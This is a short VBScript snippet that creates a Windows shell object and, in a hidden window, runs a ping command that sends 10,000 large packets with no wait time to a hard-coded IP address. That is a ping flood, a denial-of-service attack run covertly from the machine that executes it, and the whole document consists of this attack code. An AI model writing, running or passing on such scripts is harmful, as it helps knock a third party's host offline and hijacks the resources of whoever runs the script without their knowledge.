Set src3 = CreateObject("Wscript.shell")
src3.run "command /c ping -n 10000 -l 10000 -w 0 65.26.96.90 ",0,true
